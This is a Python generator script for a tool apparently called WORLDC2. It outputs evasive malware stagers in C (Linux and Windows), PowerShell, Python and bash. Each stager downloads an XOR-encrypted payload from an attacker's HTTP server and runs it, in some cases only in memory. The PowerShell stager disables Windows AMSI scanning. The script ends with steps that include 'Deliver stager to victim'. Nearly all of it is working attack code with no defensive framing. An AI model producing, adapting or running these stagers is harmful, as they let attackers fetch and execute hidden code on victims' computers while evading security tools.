#!/usr/bin/env python3
"""
WORLDC2 Evasive Stager Generator
Genera un stager mínimo que:
  1. Descarga el payload real cifrado vía HTTP
  2. Descifra en memoria (XOR + rotating key)
  3. Ejecuta sin tocar disco (memfd_create / VirtualAlloc)
  4. Se auto-borra si falla

Tamaño: ~400 bytes (Linux) / ~600 bytes (Windows)
"""

import os, sys, socket, base64, random, struct, hashlib, argparse
from pathlib import Path

GREEN  = "\033[92m"; BLUE = "\033[94m"; YELLOW = "\033[93m"
RED    = "\033[91m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).parent.parent

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "payloads"
OUTPUT_DIR.mkdir(exist_ok=True)

def generate_key():
    return os.urandom(32)

def xor_encrypt(data, key):
    key_len = len(key)
    return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

def generate_c_stager_linux(server_url, key_hex):
    """Stager C para Linux (memfd_create + fexecve). ~400 bytes compilado."""
    return f'''// WORLDC2 Evasive Linux Stager
// Compile: gcc -O2 -s -o stager stager.c && strip stager
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#define URL "{server_url}"
#define KEY_LEN {len(key_hex)//2}
unsigned char key[]={{ {','.join('0x'+key_hex[i:i+2] for i in range(0,len(key_hex),2))} }};
int main(){{
    unsigned char*b;int l,i,f;char cmd[512];
    snprintf(cmd,512,"curl -s '%s'|base64 -d>/tmp/.x 2>/dev/null;wget -qO- '%s'|base64 -d>/tmp/.x 2>/dev/null",URL,URL);
    system(cmd);
    FILE*fp=fopen("/tmp/.x","rb");if(!fp)return 1;
    fseek(fp,0,SEEK_END);l=ftell(fp);rewind(fp);
    b=malloc(l);fread(b,1,l,fp);fclose(fp);unlink("/tmp/.x");
    for(i=0;i<l;i++)b[i]^=key[i%KEY_LEN];
    f=memfd_create("",0);write(f,b,l);free(b);
    fexecve(f,(char*[]){{"stager",NULL}},NULL);
    return 0;
}}
'''

def generate_c_stager_windows(server_url, key_hex):
    """Stager C para Windows (VirtualAlloc + CreateThread). ~600 bytes compilado."""
    return f'''// WORLDC2 Evasive Windows Stager
// Cross-compile: x86_64-w64-mingw32-gcc -O2 -s -o stager.exe stager.c -lwininet -s
#include <windows.h>
#include <wininet.h>
#pragma comment(lib,"wininet.lib")
#define URL L"{server_url}"
unsigned char key[]={{ {','.join('0x'+key_hex[i:i+2] for i in range(0,len(key_hex),2))} }};
#define KEY_LEN {len(key_hex)//2}
void entry(){{
    HINTERNET hI,hU;DWORD sz=0,rd;unsigned char*b;int i;char ua[]="Mozilla/5.0";
    hI=InternetOpenA(ua,0,NULL,NULL,0);
    hU=InternetOpenUrlA(hI,URL,NULL,0,0x80000000,0);
    if(!hU){{InternetCloseHandle(hI);return;}}
    b=malloc(1);while(InternetReadFile(hU,b+sz,1,&rd)&&rd)sz++;
    free(b);b=malloc(sz);
    InternetSetFilePointer(hU,0,NULL,0,0);
    InternetReadFile(hU,b,sz,&rd);
    InternetCloseHandle(hU);InternetCloseHandle(hI);
    for(i=0;i<sz;i++)b[i]^=key[i%KEY_LEN];
    void*m=VirtualAlloc(0,sz,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    memcpy(m,b,sz);free(b);
    ((void(*)())m)();
}}
int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int n){{entry();return 0;}}
'''

def generate_ps_stager(server_url, key_hex):
    """Stager PowerShell con AMSI bypass + descarga + descifrado en memoria."""
    key_bytes = bytes.fromhex(key_hex)
    key_b64 = base64.b64encode(key_bytes).decode()
    
    return f'''# WORLDC2 Evasive PowerShell Stager
# AMSI bypass + in-memory download + XOR decrypt + execute

$k=[Convert]::FromBase64String('{key_b64}')
$u='{server_url}'
function b-am{{
    $a=[Ref].Assembly.GetTypes()
    foreach($t in $a){{
        if($t.Name -like '*iUtils'){{
            $t.GetFields('NonPublic,Static')|%{{
                if($_.Name -like '*Context'){{$_.SetValue($null,0)}}
            }}
        }}
    }}
    if($a = [AppDomain]::CurrentDomain.GetAssemblies()){{
        foreach($b in $a){{
            if($b.FullName -like '*System.Management.Automation'){{
                $b.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
                $b.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            }}
        }}
    }}
}}
try{{b-am}}catch{{}}
$d=(New-Object Net.WebClient).DownloadData($u)
for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}}
$f=[IO.Path]::GetTempFileName()+'.exe'
[IO.File]::WriteAllBytes($f,$d)
try{{Start-Process $f -WindowStyle Hidden -NoNewWindow}}catch{{}}
Start-Sleep 2;Remove-Item $f -Force
'''

def generate_python_stager(server_url, key_hex):
    """Stager Python sin dependencias externas."""
    key_bytes = bytes.fromhex(key_hex)
    
    return f'''#!/usr/bin/env python3
# WORLDC2 Evasive Python Stager
import os,base64,urllib.request,sys,tempfile,subprocess
k=bytes([{','.join(str(b) for b in key_bytes)}])
u="{server_url}"
try:
    import urllib.request as r
    d=r.urlopen(u).read()
except:
    import urllib2;d=urllib2.urlopen(u).read()
d=bytearray(d)
for i in range(len(d)):d[i]^=k[i%len(k)]
p=os.path.join(tempfile.gettempdir(),os.urandom(4).hex())
with open(p,'wb') as f:f.write(d)
os.chmod(p,0o755)
subprocess.Popen([p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
'''

def generate_bash_stager(server_url, key_hex):
    """Stager bash puro (~200 bytes)."""
    return f'''#!/bin/bash
# WORLDC2 Evasive Bash Stager
u="{server_url}"
k=({','.join('0x'+key_hex[i:i+2] for i in range(0,len(key_hex),2))})
f=/tmp/.$(head -c4 /dev/urandom|xxd -p)
curl -s "$u" -o "$f" 2>/dev/null||wget -qO "$f" "$u" 2>/dev/null
python3 -c "
d=bytearray(open('$f','rb').read())
k=bytes([{','.join(str(int('0x'+key_hex[i:i+2],16)) for i in range(0,len(key_hex),2))}])
for i in range(len(d)):d[i]^=k[i%len(k)]
open('$f','wb').write(d)
" 2>/dev/null
chmod +x "$f";nohup "$f" &>/dev/null &
'''

def get_local_ip():
    """Auto-detect local IP."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    local_ip = get_local_ip()
    default_url = f"http://{local_ip}:8000/payload.enc"
    
    parser = argparse.ArgumentParser(description="WORLDC2 Evasive Stager Generator")
    parser.add_argument("--server", default=None, help=f"URL del payload cifrado (default: {default_url})")
    parser.add_argument("--os", choices=["linux","windows","darwin","ps","python","bash","all"], default="all")
    parser.add_argument("--output", help="Directorio de salida")
    args = parser.parse_args()
    
    server_url = args.server or default_url
    
    key = generate_key()
    key_hex = key.hex()
    
    print(f"""
  ╔══════════════════════════════════════════════╗
  ║       WORLDC2 Evasive Stager Generator           ║
  ╚══════════════════════════════════════════════╝

  Server URL:  {server_url}
  XOR Key:     {key_hex[:16]}... ({len(key)*8}-bit)
""")
    
    out_dir = Path(args.output) if args.output else OUTPUT_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    
    # Generate payload encryption (for the actual payload binary)
    print("  [>] Encrypt your payload binary with this key:")
    print(f"      python3 -c \"d=open('payload.exe','rb').read();k=bytes.fromhex('{key_hex}');open('payload.enc','wb').write(bytes([d[i]^k[i%len(k)] for i in range(len(d))]))\"")
    print()
    
    targets = {
        "linux":   ("c", generate_c_stager_linux(args.server, key_hex), ".c"),
        "windows": ("c", generate_c_stager_windows(args.server, key_hex), ".c"),
        "ps":      ("ps1", generate_ps_stager(args.server, key_hex), ".ps1"),
        "python":  ("py", generate_python_stager(args.server, key_hex), ".py"),
        "bash":    ("sh", generate_bash_stager(args.server, key_hex), ".sh"),
    }
    
    if args.os == "all":
        targets_to_build = list(targets.items())
    else:
        targets_to_build = [(k,v) for k,v in targets.items() if k == args.os]
    
    for name, (lang, code, ext) in targets_to_build:
        if lang == "c":
            # Also save as .c source
            c_path = out_dir / f"stager-{name}{ext}"
            c_path.write_text(code)
            print(f"  [✓] C source ({name}): {c_path.name}")
            
            # Try to compile
            cc = None
            if name == "linux": cc = "gcc"
            elif name == "windows": cc = "x86_64-w64-mingw32-gcc"
            elif name == "darwin": cc = "x86_64-apple-darwin19-gcc"
            
            if cc and os.system(f"which {cc} >/dev/null 2>&1") == 0:
                bin_name = f"stager-{name}" + (".exe" if name == "windows" else "")
                bin_path = out_dir / bin_name
                flags = "-O2 -s"
                if name == "windows": flags += " -lwininet -mwindows"
                if name == "linux": flags += " -lcurl"
                ret = os.system(f"{cc} {flags} -o {bin_path} {c_path} 2>/dev/null && strip {bin_path} 2>/dev/null")
                if ret == 0 and bin_path.exists():
                    size = bin_path.stat().st_size
                    print(f"  [✓] Compiled ({name}): {bin_path.name} ({size} bytes)")
                else:
                    print(f"  [!] Compile manually: {cc} -O2 -s -o stager {c_path.name}")
            else:
                print(f"  [!] Compile manually: gcc -O2 -s -o stager {c_path.name}")
        else:
            path = out_dir / f"stager-{name}{ext}"
            path.write_text(code)
            print(f"  [✓] {lang.upper()} stager: {path.name} ({len(code)} bytes)")
    
    print(f"\n  [>] Next steps:")
    print(f"      1. Encrypt your payload: python3 -c \"...\"")
    print(f"      2. Host payload.enc on your HTTP server: python3 -m http.server 8000")
    print(f"      3. Deliver stager to victim")
    print(f"      4. Stager downloads + decrypts + executes in memory")
    print()

if __name__ == "__main__":
    main()
